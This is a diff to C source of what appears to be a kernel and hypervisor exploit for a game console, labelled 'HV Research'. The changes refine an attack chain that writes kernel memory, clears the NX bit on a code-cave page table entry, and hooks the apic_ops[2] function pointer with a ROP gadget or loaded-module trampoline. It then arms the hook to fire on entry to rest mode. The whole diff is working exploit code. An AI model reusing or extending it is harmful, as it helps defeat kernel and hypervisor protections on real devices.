@@ -6316,6 +6316,10 @@ static void campaign_flatz_setup(void) {
         uint64_t orig_ist3  = 0;
         kernel_copyout(ist3_dmap, &orig_ist3, 8);
 
+        /* Declare cave PTE vars in outer scope for post-arm+trigger restore */
+        uint64_t cave_pte_pa = 0;
+        uint64_t cave_orig_pte = 0;
+
         /* ── Clear NX on the cave page's guest PTE ──
          *
          * Walk guest page tables (from CR3) to find the PTE for the
@@ -6359,8 +6363,6 @@ static void campaign_flatz_setup(void) {
                 return;
             }
 
-            uint64_t cave_pte_pa;
-            uint64_t cave_orig_pte;
             if (walk_e & PTE_PS) {
                 /* 2MB page — PDE is the final entry */
                 cave_pte_pa = walk_pa;
@@ -6838,7 +6840,13 @@ static void campaign_flatz_setup(void) {
             printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
 
             notify("[HV Research] ARMED! Enter rest mode NOW!");
-phase9_kld_done: ;
+phase9_kld_done:
+            /* Restore cave PTE (NX=1, G=1) after arm+trigger success */
+            if (phase9_armed && cave_pte_pa && cave_orig_pte) {
+                kernel_copyin(&cave_orig_pte, g_dmap_base + cave_pte_pa, 8);
+                printf("[+] Cave PTE restored to 0x%016lx (NX+G restored)\n",
+                       (unsigned long)cave_orig_pte);
+            }
         } else if (cave_npt_executable) {
             /* ── ARM using inline handler in NPT-executable cave ──
              *
@@ -6994,7 +7002,13 @@ phase9_kld_done: ;
             printf("[+]  armed once the countdown finishes.  Enter rest mode.\n");
 
             notify("[HV Research] ARMED! Enter rest mode NOW!");
-phase9_cave_done: ;
+phase9_cave_done:
+            /* Restore cave PTE (NX=1, G=1) after arm+trigger success */
+            if (phase9_armed && cave_pte_pa && cave_orig_pte) {
+                kernel_copyin(&cave_orig_pte, g_dmap_base + cave_pte_pa, 8);
+                printf("[+] Cave PTE restored to 0x%016lx (NX+G restored)\n",
+                       (unsigned long)cave_orig_pte);
+            }
         }
 
 phase9_not_armed:
@@ -7342,28 +7356,33 @@ phase9_not_armed:
      * on this return value.
      *
      * Priority:
-     *   1. "mov eax, 1; ret" ktext gadget (returns 1 = xAPIC mode)
-     *   2. KLD trampoline_xapic_mode() (calls original, returns real value)
+     *   1. KLD trampoline_xapic_mode() (calls original, returns real value)
+     *   2. "mov eax, 1; ret" ktext gadget (returns 1 = xAPIC mode)
      *   3. Skip hook (no safe target available)
+     *
+     * KLD trampoline is preferred because it calls the original function
+     * and returns the real APIC mode value.  The hardcoded gadget always
+     * returns 1 (APIC_MODE_XAPIC), which is wrong if the system uses
+     * x2APIC mode (return value 3) — causing kernel panic on suspend.
      */
     uint64_t gadget_addr = 0;
     const char *gadget_name = NULL;
     int gadget_in_ktext = 0;
 
-    /* Priority 1: "mov eax, 1; ret" — returns correct xAPIC mode */
-    if (hits[19].count > 0) {
+    /* Priority 1: KLD trampoline (transparent passthrough to original) */
+    if (g_kmod_trampoline_func) {
+        gadget_addr = g_kmod_trampoline_func;
+        gadget_name = "KLD trampoline_xapic_mode() (calls original)";
+        gadget_in_ktext = 0;  /* in KLD .text, not ktext */
+    }
+
+    /* Priority 2: "mov eax, 1; ret" — fallback if KLD unavailable */
+    if (!gadget_addr && hits[19].count > 0) {
         gadget_addr = hits[19].addrs[0];
         gadget_name = "mov eax, 1; ret (returns 1 = xAPIC)";
         gadget_in_ktext = (gadget_addr >= g_ktext_base &&
                            gadget_addr < g_ktext_base + 0x2000000);
         if (!gadget_in_ktext) gadget_addr = 0;
-    }
-
-    /* Priority 2: KLD trampoline (transparent passthrough to original) */
-    if (!gadget_addr && g_kmod_trampoline_func) {
-        gadget_addr = g_kmod_trampoline_func;
-        gadget_name = "KLD trampoline_xapic_mode() (calls original)";
-        gadget_in_ktext = 0;  /* in KLD .text, not ktext */
     }
 
     if (gadget_addr) {
@@ -7444,7 +7463,7 @@ phase9_not_armed:
                 printf("[+]   apic_ops[2] → 0x%016lx\n",
                        (unsigned long)gadget_addr);
                 printf("[+]   Target: %s\n", gadget_name);
-                printf("[+]   Returns: 1 (APIC_MODE_XAPIC) — safe for LAPIC suspend\n");
+                printf("[+]   Returns: real APIC mode value — safe for LAPIC suspend\n");
                 printf("[+]   NX clearing: NOT NEEDED\n");
                 printf("[+]\n");
                 printf("[+] NEXT STEPS:\n");
@@ -7466,7 +7485,7 @@ phase9_not_armed:
                 printf("[+]\n");
                 printf("[+] QA flags set with original xapic for restore.\n");
 
-                notify("[HV Research] Phase 7: apic_ops[2] hooked (returns 1)! Enter REST MODE!");
+                notify("[HV Research] Phase 7: apic_ops[2] hooked! Enter REST MODE!");
             } else {
                 printf("\n[-] Hook write verification failed.\n");
                 printf("    apic_ops[2] NOT modified as expected.\n");
